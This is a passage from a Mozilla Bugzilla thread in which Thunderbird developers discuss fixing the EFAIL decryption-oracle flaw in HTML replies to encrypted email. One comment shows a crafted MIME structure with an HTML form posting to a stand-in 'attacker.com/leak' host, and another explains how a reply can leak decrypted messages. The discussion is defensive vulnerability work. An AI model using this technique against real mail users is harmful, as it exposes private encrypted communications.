      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-29" data-comment-id="13263741">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8973795" name="attach_8973795" title="bug1419417_efail_reply_fwd.patch">attachment 8973795</a> <a href="/attachment.cgi?id=8973795&amp;action=edit" title="bug1419417_efail_reply_fwd.patch">[details]</a> <a href="/attachment.cgi?id=8973795&amp;action=diff" title="bug1419417_efail_reply_fwd.patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8973795'>[review]</a>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417">bug1419417</a>_efail_reply_fwd.patch

Do we want to pursue this solution given ...

(In reply to Patrick Brunschwig from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c25">comment #25</a>)
<span class="quote">&gt; I think this is a no-go for many users who use encrypted messages.</span ></pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8973795&amp;action=edit"
           title="bug1419417_efail_reply_fwd.patch"
           class=""
        >Attachment #8973795</a> -
        Flags: <span class="activity-deleted">review?(jorgk)</span></div></div></div><div class="change-set" id="c30"><div class="comment" data-id="13266661" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-09 13:49 PDT" data-time="1525898965">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-30" data-comment-id="13266661">(In reply to Patrick Brunschwig from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c28">comment #28</a>)
<span class="quote">&gt; Yes, I think you a have to have a mixture. You have an apparently
&gt; unencrypted HTML message that contains a hidden encrypted MIME part.</span >

Is it not allowed to have encrypted parts as siblings? E.g. part 1.1.1 also being encrypted.
Sorry if it's a stupid question :)</pre></div><div class="change-set" id="c31"><div class="comment" data-id="13267624" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a13834619_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-10 01:30 PDT" data-time="1525941022">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-31" data-comment-id="13267624">(In reply to Magnus Melin from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c30">comment #30</a>)
<span class="quote">&gt; Is it not allowed to have encrypted parts as siblings? E.g. part 1.1.1 also
&gt; being encrypted.
&gt; Sorry if it's a stupid question :)</span >

It's not a stupid question at all :) It's technically allowed and possible to have encrypted and non-encrypted parts as siblings. However, no email client would ever produce such a message. The only way to achieve such a message structure is to manually craft it, and therefore the user should be warned if he gets such a message.</pre></div><div class="change-set" id="c32"><div class="comment" data-id="13267662" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a13834619_176914"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-10 01:57 PDT" data-time="1525942628">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-32" data-comment-id="13267662">Agreed with &#64;Patrick. If part 1.1.1 is actually encrypted or not should be irrelevant for the attack (the attacker could do both).

The major problem imho is multiple MIME parts that are bleeding into each other -&gt; attacker-controlled HTML/CSS content is mixed with sensitive, plaintext content, rendered into the same DOM. Given the evolution web standards, other variants of the attack may only be a matter of time. At least I would not trust mail encryption my life (but some people actually have to) :/

Btw, I like Enigmail's handling of PGP/INLINE where the whole email is forced to be rendered as text-only.</pre></div><div class="change-set" id="c33"><div class="comment" data-id="13267943" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-10 05:28 PDT" data-time="1525955337">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-33" data-comment-id="13267943">(In reply to Jens Müller from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c32">comment #32</a>)
<span class="quote">&gt; Agreed with &#64;Patrick. If part 1.1.1 is actually encrypted or not should be
&gt; irrelevant for the attack (the attacker could do both).</span >

I'm slightly confused now. Patrick said a mixture is required (<a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c28">comment 28</a>). 

But from later comments, it sounds separately encrypted siblings is technically allowed and possible (for an attacker). The approach Enigmail took of warning if only one sibling was unencrypted would seem still attackable for that case.

<span class="quote">&gt; The major problem imho is multiple MIME parts that are bleeding into each
&gt; other</span >

Yes this is unfortunate and something I'd like to change - but it's a larger project to do that properly.</pre></div><div class="change-set" id="c34"><div class="comment" data-id="13268188" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a13834619_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-10 07:08 PDT" data-time="1525961293">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-34" data-comment-id="13268188">(In reply to Magnus Melin from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c33">comment #33</a>)
<span class="quote">&gt; But from later comments, it sounds separately encrypted siblings is
&gt; technically allowed and possible (for an attacker). The approach Enigmail
&gt; took of warning if only one sibling was unencrypted would seem still
&gt; attackable for that case.</span >

You're right, my example is not complete. In my example in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c28">comment #28</a> the MIME part 1.1.1 could also be a multipart/encrypted message part which contains a text/html part. Or the structure could be like below, which would probably also be attack-able:

multipart/mixed 1.1
   |--- Content-Type: text/html 1.1.1
   |    &lt;form action=&quot;<a rel="nofollow" href="https://attacker.com/leak">https://attacker.com/leak</a>&quot; method=&quot;post&quot;&gt;
   |    &lt;button type=&quot;submit&quot;&gt;
   |    &lt;textarea
   |--- Content-Type: multipart/mixed 1.1.2     
         |--- Content-Type: multipart/encrypted 1.1.2.1


How about the following rule: there should be no &quot;text/html&quot; MIME part earlier in the tree than a &quot;multipart/encrypted&quot; MIME part - after everything earlier in the tree has been decrypted (i.e. tree traversal by depth first). 

I'm not sure how to deal with message/rfc822 MIME parts though (attached messages).</pre></div><div class="change-set" id="c35"><div class="comment" data-id="13274904" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 00:04 PDT" data-time="1526281446">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-35" data-comment-id="13274904">We should make it possible to compose in html again, but for the moment I'd take this as a band-aid.</pre></div><div class="change-set" id="c36"><div class="comment" data-id="13275324" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 03:15 PDT" data-time="1526292955">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-36" data-comment-id="13275324">What exactly is the attack vector? Do you have a test case and can you explain how the patch addresses the attack vector?

I just want to make sure we're not throwing out the baby with the bathwater given Patrick's <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c25">comment #25</a>:
  &quot;I think this is a no-go for many users who use encrypted messages.&quot;
So a &quot;no-go&quot; doesn't appear very attractive even as a band-aid.</pre></div><div class="change-set" id="c37"><div class="comment" data-id="13275377" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 03:50 PDT" data-time="1526295045">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-37" data-comment-id="13275377">Simply put: if you have encrypted messages for A that you want to read, send a mail to A, asking them a question so that A would reply. Craft the mail to secretly (like in the alternative content for a supported element) include the encrypted messages. The reply you get back now have all the content of the messages in decrypted from.

By converting to plain text the unintended messages are either removed in the html-&gt;plaintext process, or there clearly visible to the user in the reply window.

You could argue the attack requires you to obtain those encrypted mails, which may be easy or not, depending on what kind of an attacker you are. (Maybe you're the admin of the mail server, then it's easy.) But then again, to protect against these kind of attacks is the motivation to use encryption in the first place. Traffic between mail servers is largely secured nowadays.</pre></div><div class="change-set" id="c38"><div class="comment" data-id="13275397" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 04:11 PDT" data-time="1526296297">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-38" data-comment-id="13275397">Oh, I understand the simple version ;-) Do you have a test message or instructions how to easily construct one? Or would you like me to send you a signed S/MIME message, so you can send a &quot;crafted&quot; encrypted one back?</pre></div><div class="change-set" id="c39"><div class="comment" data-id="13275430" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 04:51 PDT" data-time="1526298662">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-39" data-comment-id="13275430">I'll get back to you in the evening. But basically, in <a rel="nofollow" href="https://bugzilla.mozilla.org/attachment.cgi?id=8930485">https://bugzilla.mozilla.org/attachment.cgi?id=8930485</a> the red area would include decrypted content if you had the proper keys. (And would obviously be hidden by styling etc. in the real world)</pre></div><div class="change-set" id="c40"><div class="comment" data-id="13275467" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 05:20 PDT" data-time="1526300433">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-40" data-comment-id="13275467">You mean <span class=""><a href="/attachment.cgi?id=8930484" name="attach_8930484" title="Decryption oracle PoC 1: Leaking plaintext through reply/forward">attachment 8930484</a> <a href="/attachment.cgi?id=8930484&amp;action=edit" title="Decryption oracle PoC 1: Leaking plaintext through reply/forward">[details]</a></span>, right, since that's the one for reply/forward.</pre></div><div class="change-set" id="c41"><div class="comment" data-id="13275479" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 05:27 PDT" data-time="1526300831">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8975458"
         class="attachment"
         data-id="8975458" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="A1-dec-pgp-smime-html-reply.eml">
      <meta itemprop="contentSize" content="2090">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8975458" itemprop="contentUrl">
        <span id="att-8975458-description" itemprop="description">A1-dec-pgp-smime-html-reply.eml</span></a>
        — <a href="attachment.cgi?id=8975458&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-41" data-comment-id="13275479">OK, here's an example where I put an S/MIME block I can decrypt into a part of the message.

Upon HTML reply the decrypted text is found visibly in the body of the mail and is shipped out upon send.

Now let's try with the patch.</pre></div><div class="change-set" id="a15025959_176914"><div class="change" id="aa15025959_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15025959_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15025959_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15025959_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15025959_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 05:27 PDT" data-time="1526300850">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8975458&amp;action=edit"
           title="A1-dec-pgp-smime-html-reply.eml"
           class=""
        >Attachment #8975458</a> -
        Attachment mime type: message/rfc822 &rarr; text/plain</div></div></div><div class="change-set" id="c42"><div class="comment" data-id="13275531" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15025959_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 05:50 PDT" data-time="1526302221">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-42" data-comment-id="13275531">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8973795" name="attach_8973795" title="bug1419417_efail_reply_fwd.patch">attachment 8973795</a> <a href="/attachment.cgi?id=8973795&amp;action=edit" title="bug1419417_efail_reply_fwd.patch">[details]</a> <a href="/attachment.cgi?id=8973795&amp;action=diff" title="bug1419417_efail_reply_fwd.patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8973795'>[review]</a>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417">bug1419417</a>_efail_reply_fwd.patch

As far as I can see, this doesn't work. With the patch applied, the decrypted text is still present invisibly in the composition. Also, the composition is NOT downgraded to plaintext.

Looks like encryptedURIService-&gt;IsEncrypted(originalMsgURI, &amp;isEncrypted); will return 'false' since only a message part is encrypted. I don't know, I haven't debugged it.

At least with the example I attached, &quot;forward&quot; doesn't appear to be an attack vector. I don't see the decrypted text anywhere in the forwarded message when inspecting the HTML.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8973795&amp;action=edit"
           title="bug1419417_efail_reply_fwd.patch"
           class=""
        >Attachment #8973795</a> -
        Flags: review-</div></div></div><div class="change-set" id="c43"><div class="comment" data-id="13275990" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15025959_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-14 08:32 PDT" data-time="1526311930">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-43" data-comment-id="13275990">I would always run all cited text through the &quot;HTML sanitizer&quot; (Simple HTML). It will strip all funky HTML and leave only basic HTML in there. To avoid other attack vectors, I'd do that for all email, not just encrypted ones. I've seen other security and privacy bugs in HTML Replies, and that would stop them all cold. After all, it is only for quoting/citing.

The HTML sanitizer was made for cases like this: To be secure.

